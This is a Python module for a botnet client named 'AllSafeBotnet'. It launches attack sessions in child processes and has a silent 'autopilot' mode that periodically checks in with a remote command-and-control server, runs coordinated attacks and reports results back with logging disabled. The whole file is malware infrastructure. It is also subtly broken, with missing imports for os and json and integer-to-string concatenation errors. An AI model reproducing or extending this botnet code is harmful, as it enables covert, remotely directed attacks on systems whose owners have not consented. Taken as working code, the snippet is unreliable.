"""
This is the module handling the AllSafeBotnet operations and 
interfaces to the control panel.

Created:    17 January 2017
Modified:   17 January 2017
"""

from multiprocessing import Process, Queue
from time import sleep as threadSleep

from utils.log import logCCUpdate

from Worker import AllSafeWorkerMaster


class AllSafeBotnet():
    def __init__(self):
        """
        This class represents the core functionalities for the AllSafeBotnet,
        it can be initialized and awaits to be called in order to transfer
        to another process an attack to be carried.
        """
        self._attack_counter  = 0
        self._attempt_counter = 0
        # initiliazing botnet client unique id
        self._botnet_identity = str(hash(os.path.expanduser('~')))
        # initializing queue 
        self._botnet_queue    = Queue()
        # botnet instance
        self._botnet_instance = None


    def attack(self, configuration, override=False):
        """
        Method to start a new attack session.
        @param: configuration, string - path to the configuration file
        @return: a tuple (identification, attack_statistics_dictionary, attack_counter)
        """
        self._botnet_instance = self.Botnet(configuration, self._botnet_queue)

        botnet = self._botnet_instance
        botnet.start()

        # retrieving statistics and joining
        attackstats = self._botnet_queue.get()
        botnet.join()

        self._attack_counter += 1

        # returning statistics and counter
        return self._botnet_identity, attackstats, self._attack_counter

    def abort(self):
        """
        Method to abort botnet execution if any is currently operational.
        """
        botnet = self._botnet_instance
        if botnet:
            if botnet.is_alive():
                botnet.terminate()
                self._botnet_queue = Queue()

    def autopilot(self, server, configuration, timer, override=False):
        """
        Method to start a new attack session silently... with autopilot inserted.
        Note: no runtime logging or stats are enabled!
        @param: server, string - C&C remote address
        @param: configuration, string - path to the configuration file
        @param: timer, int - time interval in seconds between each iteration
        """
        while True:
            # override mode -> local configuration!
            if override:
                id, resources, counter = self.attack(configuration, override=True)
            # periodically check for C&C to carry a coordinated attack
            else:
                up = logCCUpdate(server, self._botnet_identity, "autopilot mode... attack " + self._attack_counter + "executing")
                if up:
                    try:
                        id, resources, counter = self.attack(configuration, override=False)
                        logCCUpdate(server, id, "attack n. " + str(counter) + " (failed " + self._attempt_counter + " times)" + "\n" + str(json.dumps(resources, indent=4)))
                        self._attempt_counter = 0
                    except Exception:
                        self._attempt_counter += 1

            threadSleep(timer)
            



    class Botnet(Process):
        def __init__(self, configuration, queue, name='AllSafeBotnetInstance', override=False):
            super().__init__(name=name)
            self._queue          = queue
            self._configuration  = configuration
            self._override_conf  = override
            # initialize master
            try:
                self._allsafe_master = AllSafeWorkerMaster(self._configuration, override=self._override_conf)
            except Exception:
                raise Exception("Error in Botnet initialization!")

        def run(self):
            # starting the attack
            self._allsafe_master.initializeWorkers()
            stat = self._allsafe_master.executeBotnet()
            self._queue.put(stat)